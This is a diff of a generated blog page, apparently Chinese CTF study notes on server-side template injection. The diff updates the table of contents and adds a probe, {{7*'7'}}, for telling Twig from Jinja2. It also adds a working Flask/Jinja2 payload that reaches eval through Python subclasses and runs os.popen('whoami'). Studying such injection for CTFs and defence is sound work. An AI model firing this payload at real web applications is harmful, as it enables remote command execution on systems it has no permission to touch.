@@ -204,7 +204,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/CTF笔记/">
-                    CTF笔记 <span class="right">11 篇</span></a>
+                    CTF笔记 <span class="right">13 篇</span></a>
                 </a>
             </li>
 
@@ -302,7 +302,7 @@
 
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="section table-of-contents-text">SSTI模板注入</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="section table-of-contents-text">一、前言</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1%E3%80%81%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="section table-of-contents-text">1、模板引擎</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#2%E3%80%81SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="section table-of-contents-text">2、SSTI（模板注入）</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81Php%E4%B8%AD%E7%9A%84SSTI"><span class="section table-of-contents-text">二、Php中的SSTI</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1%E3%80%81Twig"><span class="section table-of-contents-text">1、Twig</span></a></li></ol></li></ol></li></ol>
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="section table-of-contents-text">SSTI模板注入</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="section table-of-contents-text">一、前言</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1%E3%80%81%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="section table-of-contents-text">1、模板引擎</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#2%E3%80%81SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="section table-of-contents-text">2、SSTI（模板注入）</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81Php%E4%B8%AD%E7%9A%84SSTI"><span class="section table-of-contents-text">二、Php中的SSTI</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1%E3%80%81Twig"><span class="section table-of-contents-text">1、Twig</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E3%80%81%E5%88%A4%E6%96%AD%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E6%96%B9%E6%B3%95"><span class="section table-of-contents-text">三、判断模板引擎的方法</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%9B%9B%E3%80%81%E6%A8%A1%E6%9D%BF%E5%B8%B8%E7%94%A8payload"><span class="section table-of-contents-text">四、模板常用payload</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1%E3%80%81flask"><span class="section table-of-contents-text">1、flask</span></a></li></ol></li></ol></li></ol>
 </div>
 
 
@@ -330,6 +330,10 @@
 <p>此时输入xss代码，形成了攻击。</p>
 <p><img src="https://s1.ax1x.com/2020/10/05/0tFu0U.png" alt="0tFu0U.png"></p>
 <p>对于一个疑似有SSTI的网站，我们可以使用不用引擎的独有语句进行测试，来判断它是什么模板引擎，从而运用对应的Payload。<strong>Twig</strong>引擎的独特语句有，这是一个注释语句。</p>
+<h3 id="三、判断模板引擎的方法"><a href="#三、判断模板引擎的方法" class="headerlink" title="三、判断模板引擎的方法"></a>三、判断模板引擎的方法</h3><p>You can try to probe <code>&#123;&#123;7*'7'&#125;&#125;</code> to see if the target is vulnerable. It would result in <code>49</code> in Twig, <code>7777777</code> in Jinja2, and neither if no template language is in use.</p>
+<h3 id="四、模板常用payload"><a href="#四、模板常用payload" class="headerlink" title="四、模板常用payload"></a>四、模板常用payload</h3><h4 id="1、flask"><a href="#1、flask" class="headerlink" title="1、flask"></a>1、flask</h4><p>命令执行（flask1.1.2 python3.7.7）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 
                 
 <p class="pink-link-context">
